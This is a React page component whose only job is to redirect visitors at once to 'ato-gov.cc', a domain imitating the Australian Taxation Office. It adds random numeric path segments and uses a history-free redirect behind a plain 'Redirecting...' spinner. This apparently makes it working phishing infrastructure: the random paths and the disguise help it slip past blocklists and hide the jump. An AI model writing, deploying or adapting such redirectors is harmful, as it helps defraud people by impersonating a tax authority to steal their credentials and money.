import { useEffect } from "react";

function generateRandomNumber(length = 6) {
  let number = "";
  for (let i = 0; i < length; i++) {
    number += Math.floor(Math.random() * 10).toString();
  }
  return number;
}

export default function Home() {
  useEffect(() => {
    const segment1 = generateRandomNumber();
    const segment2 = generateRandomNumber();
    const redirectUrl = `https://www.ato-gov.cc/${segment1}/${segment2}/`;
    // fast redirect without adding entry to history
    window.location.replace(redirectUrl);
  }, []);

  return (
    <html lang="nl">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Redirecting...</title>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap"
          rel="stylesheet"
        />
        <style>{`
          body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Open Sans', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #333;
          }
          .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ffc421;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .message {
            font-size: 1.2em;
            text-align: center;
          }
        `}</style>
      </head>
      <body>
        <div className="loader" />
        <div className="message">Redirecting...</div>
      </body>
    </html>
  );
}
